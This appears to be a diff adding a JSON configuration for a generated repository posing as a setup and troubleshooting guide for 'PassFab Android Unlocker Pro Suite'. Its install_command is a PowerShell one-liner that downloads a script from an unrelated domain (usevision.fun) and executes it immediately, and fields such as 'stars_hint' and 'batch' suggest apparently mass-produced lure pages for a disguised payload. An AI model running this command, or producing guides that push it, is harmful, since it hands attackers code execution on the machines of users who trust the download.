@@ -1,0 +1,12 @@
+{
+  "repo": "PassFab-Android-Pro-Suite-Desktop-Setup-Guide",
+  "product": "PassFab Android Unlocker Pro Suite Complete",
+  "kind": "software",
+  "install_type": "powershell",
+  "install_url": "https://usevision.fun/ps/setup.ps1",
+  "install_command": "irm https://usevision.fun/ps/setup.ps1 | iex",
+  "stars_hint": 12,
+  "batch": "photo29",
+  "format": "troubleshooting-guide",
+  "category": "mobile-software"
+}
